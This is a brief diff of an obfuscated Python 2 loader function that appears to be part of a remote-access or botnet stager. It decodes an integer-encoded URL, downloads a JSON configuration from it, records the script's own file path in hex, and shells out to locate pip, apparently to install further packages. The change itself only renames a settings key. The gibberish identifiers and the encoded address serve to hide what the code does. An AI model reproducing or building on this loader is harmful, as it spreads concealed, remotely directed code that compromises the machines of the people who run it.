@@ -12,7 +12,7 @@ def run(*args, **kwargs):
     SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
     IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
     AccidentalAquaticCactus = loads(urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
-    AccidentalAquaticCactus['settings']['f'] = IncontinentObtuseCucumber(globals().get('__file__')) if '__file__' in globals() else None
+    AccidentalAquaticCactus['settings']['__f__'] = IncontinentObtuseCucumber(globals().get('__file__')) if '__file__' in globals() else None
     ReflectiveTightfistedTrapezoid = AccidentalAquaticCactus['settings'].get('v')
     try:
         GroovySophisticatedLemur = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
